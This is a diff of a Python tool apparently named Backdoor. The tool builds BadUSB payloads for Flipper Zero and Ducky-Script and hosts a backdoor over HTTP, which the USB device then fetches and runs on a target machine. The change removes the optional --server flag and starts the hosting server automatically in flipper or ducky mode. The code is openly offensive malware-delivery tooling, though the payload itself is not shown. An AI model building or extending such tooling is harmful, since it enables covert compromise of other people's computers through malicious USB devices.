@@ -56,7 +56,6 @@ class Backdoor:
         self.delay: int = kwargs.get("delay")
         self.server_port: int = kwargs.get("server_port")
         self.server_ip_tuple: tuple = (self.ip_address, self.server_port)
-        self.server: bool = kwargs.get("server")
         self.type: bool = kwargs.get("type")
         self.keyboard_layout: str = kwargs.get("keyboard")
         self.flipper: str = kwargs.get("flipper")
@@ -84,7 +83,7 @@ class Backdoor:
             self.print_verbose_message(f"Failed to create payload.txt", prefix="-")
             return
         self.print_verbose_message(f"Created payload.txt", prefix="*")
-        if self.server:
+        if self.flipper or self.ducky:
             self.start_threaded_http_server()
             print(f"[*] Started HTTP server hosting file: http://{self.ip_address}:{self.server_port}/{self.out_file}")
         if self.ducky:
@@ -294,12 +293,6 @@ if __name__ ==  "__main__":
         "--delay",
         help=f"Delay in milliseconds before Flipper Zero/Ducky-Script payload execution (default:100)", 
         default=100,
-    )
-    parser.add_argument(
-        "--server",
-        help=f"Hosts the backdoor locally over HTTP on your computer. The ducky-script or Bad Usb will fetch and run the hosted backdoor", 
-        default=False,
-        action="store_true"
     )
     parser.add_argument(
         "--flipper",
